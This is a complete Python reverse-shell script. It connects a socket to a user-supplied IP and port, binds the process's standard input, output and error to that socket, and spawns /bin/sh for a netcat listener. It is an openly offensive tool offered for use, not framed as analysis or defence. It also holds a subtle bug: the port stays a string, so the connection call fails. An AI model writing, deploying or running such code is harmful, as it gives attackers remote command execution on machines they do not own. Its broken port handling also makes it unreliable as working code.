#!/usr/bin/python3
#Simple python reverse shell. Set up a netcat listener, change the IP:Port and run
import os
import pty
import socket
import sys

target_ip = input("Please input the target IP: ")
target_port = input("Please input the target Port: ")

#Create and connect to socket
s = socket.socket()
try:
  s.connect((target_ip, target_port))
except Exception as e:
  print(f"Error connecting to {target_ip}:{target_port} - {e} check firewall and verifiy connectivity")
  sys.exit(1)
#Redirect standard file descriptors to the specified socket
[os.dup2(s.fileno(), fd) for fd in (0,1,2)]
#Spawns shell at listener
pty.spawn("/bin/sh")
